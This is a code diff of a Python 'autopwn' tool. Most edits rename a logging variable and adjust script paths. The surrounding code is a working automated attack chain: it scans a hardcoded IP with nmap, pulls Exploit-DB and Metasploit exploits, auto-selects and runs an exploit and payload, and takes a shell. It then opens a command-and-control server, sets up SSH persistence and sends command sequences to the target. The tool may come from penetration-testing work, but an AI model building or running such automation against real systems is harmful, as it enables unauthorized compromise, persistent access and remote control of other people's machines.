@@ -33,9 +33,9 @@ CRITICAL = RED + "Critical" + RESET
 SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}
 
 
-logfile = open("./logtest", "a+")
+LOGFILE = open("./LOGS", "a+")
 
-LOG("Launched autopwn.", logfile, "inf")
+LOG("Launched autopwn.", LOGFILE, "inf")
 
 IP = "192.168.1.45"
 EXPLOIT_LIST = "./exploit_list"
@@ -77,7 +77,7 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         cmd = "./nmap.sh " + ip + " >> /dev/null"
         msg = "Launching scan over @" + ip + " cmd :" + cmd
         print("[i] Launching scan over @" + ip + " cmd :" + cmd)
-        LOG(msg, logfile, "log")
+        LOG(msg, LOGFILE, "log")
         scan = subprocess.run(cmd, shell=True)
 
         if "0 hosts up" in Path("./detect.xml").read_text():
@@ -86,15 +86,15 @@ def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, ip=IP):
         if scan:
             msg = "Scan over successfully"
             print("[V] Scan over successfully")
-            LOG(msg, logfile, "log")
+            LOG(msg, LOGFILE, "log")
         else:
-            LOG("Error 1 : nmap failed.", logfile, "err")
+            LOG("Error 1 : nmap failed.", LOGFILE, "err")
             print("[X] Error 1 : nmap failed.")
-            return []
-        cmd = "./explook.sh >> /dev/null"
+            return[]
+        cmd = "./explookup.sh  >> /dev/null"
         msg = "Retrieving exploits"
         print("[i] Retrieving exploits")
-        LOG(msg, logfile, "log")
+        LOG(msg, LOGFILE, "log")
         scan = subprocess.run(cmd, shell=True)
     with open(exploit_path, "r+") as f:
         result = json.loads(f.read())
@@ -121,7 +121,7 @@ def convert_path(path: str) -> str:
 def getEdbExploit(res=[], get_all=False):
     """Retrieve EDB exploits that are missing in metasploit"""
     edbExploits = []
-    LOG("Retrieving EDB exploits...", logfile, "log")
+    LOG("Retrieving EDB exploits...", LOGFILE, "log")
     for search in res:
         edbExploits += search["RESULTS_EXPLOIT"]
     paths = []
@@ -136,7 +136,7 @@ def getEdbExploit(res=[], get_all=False):
                 dest_path = convert_path(path)
                 os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                 shutil.copy(path, dest_path)
-    LOG("EDB exploits retrieved", logfile, "log")
+    LOG("EDB exploits retrieved", LOGFILE, "log")
 
 
 def showEdbExploit(exploitPath="") -> None:
@@ -152,7 +152,7 @@ def createExploitList(res=[]) -> tuple[list[str], list[str]]:
     exploits = []
     for search in res:
         exploits += search["RESULTS_EXPLOIT"]
-    LOG("Imported exploit_list", logfile, "log")
+    LOG("Imported exploit_list", LOGFILE, "log")
     if exploits:
         noDuplicattes = []
         [noDuplicattes.append(i) for i in exploits if not noDuplicattes.count(i)]
@@ -160,10 +160,10 @@ def createExploitList(res=[]) -> tuple[list[str], list[str]]:
         titles = [pwn["Title"] for pwn in exploits]
         titles = [[k, title] for k, title in enumerate(titles)]
     else:
-        LOG("Error 2 : Parsing error or no exploits.", logfile, "err")
+        LOG("Error 2 : Parsing error or no exploits.", LOGFILE, "err")
         print("[X] Error 2 : Parsing error or no exploits.")
         return []
-    LOG("Parsed ./exploit_list", logfile, "log")
+    LOG("Parsed ./exploit_list", LOGFILE, "log")
     metaexploits = []
     for j in range(len(titles)):
         if "(Metasploit)" in titles[j][1]:
@@ -188,13 +188,13 @@ def runMetasploit(reinit=False, show=True, wait=True) -> MsfRpcClient:
     )
     if wait:
         time.sleep(5)
-    LOG("Started process msfrpcd", logfile, "inf")
+    LOG("Started process msfrpcd", LOGFILE, "inf")
 
     if reinit:
         proc = subprocess.run(
             "echo yes | msfdb reinit", shell=True, stdout=redirect, stderr=redirect
         )  # if db problem
-        LOG("Started process msfdb (arg reinit)", logfile, "inf")
+        LOG("Started process msfdb (arg reinit)", LOGFILE, "inf")
 
     client = MsfRpcClient("yourpassword", ssl=True)
     print("\n")
@@ -202,7 +202,7 @@ def runMetasploit(reinit=False, show=True, wait=True) -> MsfRpcClient:
 
 
 def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
-    LOG("Looking for best modules...", logfile, "log")
+    LOG("Looking for best modules...", LOGFILE, "log")
     attack_cpy = attack
     modules = []
     while len(attack_cpy) > 10 and modules == []:
@@ -213,9 +213,9 @@ def searchModules(client: MsfRpcClient, attack: str) -> list[dict]:
         pprint.pprint(
             str(k) + " : " + modules[k]["type"] + " : " + modules[k]["fullname"]
         )
-    LOG("Displayed modules", logfile, "log")
+    LOG("Displayed modules", LOGFILE, "log")
     if modules == []:
-        LOG("Error 8 : Module error.", logfile, "err")
+        LOG("Error 8 : Module error.", LOGFILE, "err")
         print("[X] Error 8 : Module error, no module.")
         # raise Exception("NoModuleFound")
         return []
@@ -247,12 +247,12 @@ def exploitVuln(
     print("[V] Selected payloads: ", exploit.info)
 
     print("Exploit options :")
-    LOG("Displaying exploit options", logfile, "log")
+    LOG("Displaying exploit options", LOGFILE, "log")
     print(exploit.options)
     print("\n")
 
     plds = exploit.targetpayloads()
-    LOG("Displaying payload options", logfile, "log")
+    LOG("Displaying payload options", LOGFILE, "log")
     print("[~] Available payloads :")
     pprint.pprint(plds)
     print("[-1 for autochosing]")
@@ -264,18 +264,18 @@ def exploitVuln(
     print("")
     if pay_idx == -1:
         tmp = autopayload.autochose(exploit.targetpayloads())
-        LOG("Auto chosing payload", logfile, "log")
+        LOG("Auto chosing payload", LOGFILE, "log")
         if tmp == -1:
             payload = client.modules.use("payload", plds[0])
-            LOG("Could not auto select payload", logfile, "log")
+            LOG("Could not auto select payload", LOGFILE, "log")
             print("No usual payload available, reflected to : " + plds[0])
         else:
             payload = client.modules.use("payload", tmp)
             print("Autopayload selected : " + tmp)
-            LOG("Payload auto selected", logfile, "log")
+            LOG("Payload auto selected", LOGFILE, "log")
     else:
         payload = client.modules.use("payload", plds[pay_idx])
-        LOG("User selected payload", logfile, "log")
+        LOG("User selected payload", LOGFILE, "log")
     print("[V] Payload selected !")
     print("\n")
 
@@ -294,26 +294,26 @@ def exploitVuln(
             exploit[i] = Lhost
         else:
             exploit[i] = input(i + ": ")
-    LOG("Payload and exploit options set", logfile, "log")
+    LOG("Payload and exploit options set", LOGFILE, "log")
     print(exploit.execute(payload=payload))
     # cid = client.consoles.console().cid
     # client.consoles.console(cid).run_module_with_output(exploit, payload=payload)
     while len(client.jobs.list) != 0:
         pass
     if client.sessions.list == {}:
-        LOG("Error 9 : Exploit could not be executed", logfile, "err")
+        LOG("Error 9 : Exploit could not be executed", LOGFILE, "err")
         print("[X] Error 9 : Exploit could not be executed")
         raise Exception("ExploitFailure")
 
 
 def getShell(client: MsfRpcClient = None, id="1"):
     """Get shell from ID session"""
-    LOG("Shell obtained", logfile, "log")
+    LOG("Shell obtained", LOGFILE, "log")
     try:
         return client.sessions.session(id)
     except:
         print("[X] Error 10 : No shell created")
-        LOG("Error 10 : No shell created", logfile, "err")
+        LOG("Error 10 : No shell created", LOGFILE, "err")
         raise Exception("ErrorWhileGettingShell")
         # exit(-10)
 
@@ -322,7 +322,7 @@ def sendCommands(shell, sequence=[]) -> int:
     """Automated interaction with shell on target"""
     if len(sequence) == 0:
         print("[X] Error 5 : Invalid sequence.")
-        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
+        LOG("[X] Error 5 : Invalid sequence.", LOGFILE, "err")
         raise Exception("InvalidSequence")
 
     for command in sequence:
@@ -357,7 +357,7 @@ def autopwn(
     show_pwnguin()
 
     results = scanIp4Vulnerabilities(EXPLOIT_LIST, IP)
-    LOG("Vulnerabilities scanned", logfile, "log")
+    LOG("Vulnerabilities scanned", LOGFILE, "log")
     (_, exploits, metaexploits) = createExploitList(results)
     client = runMetasploit(False)
 
@@ -368,47 +368,47 @@ def autopwn(
         if exploits:
             print("[~] All exploits :")
             pprint.pprint(exploits)
-            LOG("Displayed all possible exploits to user", logfile, "log")
+            LOG("Displayed all possible exploits to user", LOGFILE, "log")
             print("\n")
         else:
-            LOG("Error 3 : No exploits found on EDB.", logfile, "err")
+            LOG("Error 3 : No exploits found on EDB.", LOGFILE, "err")
             print("[X] Error 3 : No exploits found on EDB.")
             exit(-3)
 
         if metaexploits:
             print("[~] Metasploit exploits :")
             pprint.pprint(metaexploits)
-            LOG("Displayed possible Metasploit exploits to user", logfile, "log")
+            LOG("Displayed possible Metasploit exploits to user", LOGFILE, "log")
             print("\n")
         else:
-            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
+            LOG("INFO : No exploit found on Metasploit.", LOGFILE, "inf")
             print("[i] INFO : No exploit found on Metasploit.")
 
     else:
         if metaexploits:
             print("[~] Metasploit exploits :")
             pprint.pprint(metaexploits)
-            LOG("Displayed possible Metasploit exploits to user", logfile, "log")
+            LOG("Displayed possible Metasploit exploits to user", LOGFILE, "log")
             print("\n")
         else:
-            LOG("INFO : No exploit found on Metasploit.", logfile, "inf")
+            LOG("INFO : No exploit found on Metasploit.", LOGFILE, "inf")
             print("[i] INFO : No exploit found on Metasploit.")
 
     if auto_mode:
         choice = "-1"
         print("[i] Automatic mode activated ! Selecting best exploit for you.")
-        LOG("Using auto select mode for chosing exploits", logfile, "log")
+        LOG("Using auto select mode for chosing exploits", LOGFILE, "log")
     else:
         choice = input("[~] Please select an exploit: ")
 
     if choice == "-1":
         choice = str(autoexploit.autochose(metaexploits, client))
         if choice == "-1":
-            LOG("Could not auto select exploit", logfile, "log")
+            LOG("Could not auto select exploit", LOGFILE, "log")
             choice = input("[~] Could not auto select, please select manually ")
     attack = selectExploit(choice, exploits)
     attack = re.sub("[^0-9a-zA-Z./()]+", " ", attack)
-    LOG("Exploit select : " + attack, logfile, "log")
+    LOG("Exploit select : " + attack, LOGFILE, "log")
     print("[V] Exploit selected ! :")
     print(attack)
     print("\n")
@@ -416,17 +416,17 @@ def autopwn(
     print("Starting msfrpcd...")
 
     modlist = searchModules(client, attack)
-    LOG("Modules retrieved", logfile, "log")
+    LOG("Modules retrieved", LOGFILE, "log")
     exploitVuln(Rhosts, Lhost, auto_mode, client, modlist)
 
     print(client.sessions.list)
     print("\n")
 
     shell = getShell(client, "1")
-    LOG("Shell Created", logfile, "log")
+    LOG("Shell Created", LOGFILE, "log")
     if com_and_cont:
         print("[~] Entering command and control section")
-        LOG("Entered in C&C section", logfile, "inf")
+        LOG("Entered in C&C section", LOGFILE, "inf")
 
         print("[~] Opening local C2 server ...")
         (proc, port) = postexploit.openCtrlSrv(Lhost)
@@ -434,7 +434,7 @@ def autopwn(
     else:
         ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
-    LOG("Pwn Complete ", logfile, "log")
+    LOG("Pwn Complete ", LOGFILE, "log")
     return (shell, client, ipport)
 
 
@@ -469,13 +469,13 @@ if __name__ == "__main__":
         print("An error has occured.")
         exit(-1)
 
-    LOG("Begin setup for SSH persistence", logfile, "log")
+    LOG("Begin setup for SSH persistence", LOGFILE, "log")
     print("[~] Begin setup for SSH persistence")
-    subprocess.run("./makesshkeys.sh", shell=True)
+    subprocess.run("./post/makesshkeys.sh", shell=True)
     print("[V] SSH setup done")
-    LOG("Begin sending sequences", logfile, "log")
-    sendCommands(shell, sequences.getsequence(3, srv))
-    LOG("Sequences sent", logfile, "log")
-    LOG("END OF LOGS", logfile, "crit")
-    logfile.close()
+    LOG("Begin sending sequences", LOGFILE, "log")
+    sendCommands(shell, sequences.getsequence(0, srv))
+    LOG("Sequences sent", LOGFILE, "log")
+    LOG("END OF LOGS", LOGFILE, "crit")
+    LOGFILE.close()
     exit(0)
